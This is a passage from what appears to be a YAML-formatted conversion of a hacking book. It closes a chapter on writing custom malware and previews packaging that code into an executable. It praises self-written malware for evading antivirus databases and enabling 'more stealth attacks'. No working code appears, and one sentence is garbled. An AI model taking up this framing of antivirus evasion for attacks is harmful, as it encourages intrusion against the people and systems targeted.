+    own malware is that it will not be easy and detect them programs to detect this
+    malware since it is written by you and does not yet exist in antivirus databases.
+    This gives you the opportunity for a more successful attack. Using the tools we
+    developed in this chapter will give you an understanding of how you can build
+    more advanced malware and how you can add more features to it as you wish. The
+    skills gained by writing your custom malware will give you opportunities for more
+    stealth attacks and less detection by antivirus programs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will see how we can package our code into a single executable
+    and how we can use it for hacking purposes. See you in the next chapter!
+  prefs: []
+  type: TYPE_NORMAL
